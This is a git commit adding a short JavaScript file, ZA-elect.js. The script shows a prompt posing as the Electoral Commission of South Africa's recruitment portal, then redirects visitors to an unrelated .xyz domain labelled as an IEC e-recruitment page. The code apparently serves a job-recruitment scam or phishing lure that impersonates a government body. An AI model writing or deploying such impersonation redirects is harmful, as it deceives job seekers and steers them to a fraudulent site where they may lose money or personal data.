623df569573f258d78d188d78ea30715152c2e8e
newetijazz2 <newetijazz2@gmail.com>
2025-08-14 11:07:09 +0100

    Create ZA-elect.js

---
+++ ZA-elect.js
@@ -0,0 +1,5 @@
+var password = 'Electoral Commission of South Africa (IEC)'
+password=prompt('IEC: Welcome to our recruitment portal, click OK to submit your application ','Electoral Commission of South Africa (IEC)');
+if (password != 'Electoral Commission of South Africa (IEC)') {
+location.href='https://www.botswajobs.xyz/IEC-e-Recruitment-Portal';
+}
